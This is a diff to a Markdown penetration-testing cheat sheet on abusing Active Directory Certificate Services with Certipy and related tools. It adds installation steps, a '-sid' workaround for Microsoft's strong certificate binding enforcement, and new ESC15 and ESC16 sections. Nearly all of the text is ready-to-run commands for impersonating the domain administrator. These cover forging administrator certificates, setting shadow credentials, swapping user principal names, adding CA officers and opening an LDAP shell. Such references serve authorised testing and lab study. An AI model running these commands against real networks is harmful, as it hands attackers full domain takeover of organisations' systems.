@@ -7,22 +7,25 @@
 - [ESC8](#esc8)
 - [ESC9](#esc9)
 - [ESC13](#esc13)
+- [ESC15](#esc15)
+- [ESC16](#esc16)
 
+# Installation
+https://github.com/ly4k/Certipy/wiki/04-%E2%80%90-Installation
+```
+sudo apt update && sudo apt install -y python3 python3-pip
+python3 -m venv certipy-venv
+source certipy-venv/bin/activate
+pip install certipy-ad
+```
 # Enumeration
-### NetExec
 Find PKI Enrollment Services in Active Directory and Certificate Templates Names
 ```
 nxc ldap ip -u username -p password -M adcs
 ```
-### Certipy
 Search for vulnerable certificate templates
 ```
 certipy find -u username -p password -dc-ip ip -target dc -enabled -vulnerable -stdout
-```
-### Certify
-Search for vulnerable certificate templates
-```powershell
-Certify.exe find /vulnerable
 ```
 # Attacks
 ## ESC1
@@ -36,55 +39,64 @@ Or
 ```
 certipy req -u username -p password -ca ca -target domain -template template -upn administrator -dc-ip ip
 ```
-> Sometimes if you run certipy and see `Minimum RSA Key Length              : 4096`, you need to provide `-key-size 4096` to certipy
+> Sometimes if you run certipy and see `Minimum RSA Key Length              : 4096`, you need to provide `-key-size 4096`
 ```bash
 certipy req -u username -p password -ca ca -target domain -template template -upn administrator -dc-ip ip -key-size 4096
 ```
 ```
-certipy auth -pfx administrator.pfx -domain domain -username username -dc-ip ip
+certipy auth -pfx administrator.pfx -domain domain -u username -dc-ip ip
+```
+New update:
+> By February 2025, if the StrongCertificateBindingEnforcement registry key is not configured, domain controllers will move to Full Enforcement mode
+
+https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
+
+Fix: add the sid
+```
+certipy req -u username -p password -ca ca -target domain -template template -upn administrator -sid <administrator sid> -dc-ip ip 
 ```
 ## ESC3
 ```
-certipy req -username username -password password -ca ca -target domain -template template
+certipy req -u username -p password -ca ca -target domain -template template
 ```
 ```
-certipy req username -password password -ca ca -target domain -template User -on-behalf-of 'domain\administrator' -pfx pfx_file
+certipy req username -p password -ca ca -target domain -template User -on-behalf-of administrator -pfx pfx_file
 ```
 ```
 certipy auth -pfx administrator.pfx -dc-ip ip
 ```
 ## ESC4
 ```
-certipy template -username username -password password -template template -save-old -dc-ip ip
+certipy template -u username -p password -template template -save-old -dc-ip ip
 ```
 ```
 certipy req -u username -p password -dc-ip ip -ca ca -target dc -template template -upn administrator
 ```
 ```
-certipy auth -pfx administrator.pfx -domain domain -username administrator -dc-ip ip
+certipy auth -pfx administrator.pfx -domain domain -u administrator -dc-ip ip
 ```
 ## ESC6
 ```
-certipy req -username administrator@domain -password password -ca ca -target domain -template template -upn administrator
+certipy req -u administrator@domain -p password -ca ca -target domain -template template -upn administrator
 ```
 ## ESC7
 ```
-certipy ca -ca ca -add-officer username -username username@domain -password password -dc-ip ip -dns-tcp -ns ip
+certipy ca -ca ca -add-officer username -u username@domain -p password -dc-ip ip -dns-tcp -ns ip
 ```
 ```
-certipy ca -ca ca -enable-template SubCA -username username@domain -password password -dc-ip ip -dns-tcp -ns ip
+certipy ca -ca ca -enable-template SubCA -u username@domain -p password -dc-ip ip -dns-tcp -ns ip
 ```
 ```
-certipy req -username username@domain -password password -ca ca -target ip -template SubCA -upn username@domain
+certipy req -u username@domain -p password -ca ca -target ip -template SubCA -upn username@domain
 ```
 ```
-certipy ca -ca ca -issue-request request_ID -username username@domain -password password
+certipy ca -ca ca -issue-request request_ID -u username@domain -p password
 ```
 ```
-certipy req -username username@domain -password password -ca ca -target ip -retrieve request_ID
+certipy req -u username@domain -p password -ca ca -target ip -retrieve request_ID
 ```
 ```
-certipy auth -pfx pfx_file -domain domain -username username -dc-ip ip
+certipy auth -pfx pfx_file -domain domain -u username -dc-ip ip
 ```
 ## ESC8
 ```
@@ -98,16 +110,16 @@ certipy- auth -pfx administrator.pfx
 ```
 ## ESC9
 ```
-certipy shadow auto -username username@domain -hashes :hash -account target_username
+certipy shadow auto -u username@domain -hashes :hash -account target_username
 ```
 ```
-certipy account update -username username@domain -hashes :hash -user target_username -upn administrator
+certipy account update -u username@domain -hashes :hash -user target_username -upn administrator
 ```
 ```
-certipy req -username target_username@domain -hashes :target_hash -ca ca -template template -target $DC_IP
+certipy req -u target_username@domain -hashes :target_hash -ca ca -template template -target $DC_IP
 ```
 ```
-certipy account update -username username@domain -hashes :hash -user target_username -upn administrator
+certipy account update -u username@domain -hashes :hash -user target_username -upn target_username
 ```
 ```
 certipy auth -pfx administrator.pfx -domain domain
@@ -119,7 +131,33 @@ certipy req -u username -p password -ca ca -target domain -template template -dc
 ```
 python3 gettgtpkinit.py -cert-pfx pfx_file domain/username ccache_file -dc-ip ip -v
 ```
+## ESC15
+```
+certipy req -u username@domain -p password -dc-ip ip -target dc -ca ca -template template -upn administrator@domain -sid <administrator sid> -application-policies 'Client Authentication'
+```
+
+```
+certipy auth -pfx administrator.pfx -dc-ip ip -ldap-shell
+```
+## ESC16
+We use a user that has GenericAll or GenericWrite
+```
+certipy account -u username@domain -p password -dc-ip ip -upn administrator -user owned_user update
+```
+```
+certipy req -u owned_user@domain -p password -dc-ip ip -target dc -ca ca -template User -upn administrator@domain -sid <administrator sid>
+```
+```
+certipy account -u username@domain -p password -dc-ip ip -upn owned_user -user owned_user update
+```
+```
+certipy auth -pfx administrator.pfx -dc-ip ip -domain domain
+```
+
 # Resources
+- https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation
+- https://mayfly277.github.io/posts/GOADv2-pwning-part6/
+- https://mayfly277.github.io/posts/ADCS-part14/
 - https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse
 - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation
 - https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adcs-certificate-services/#adcs-enumeration
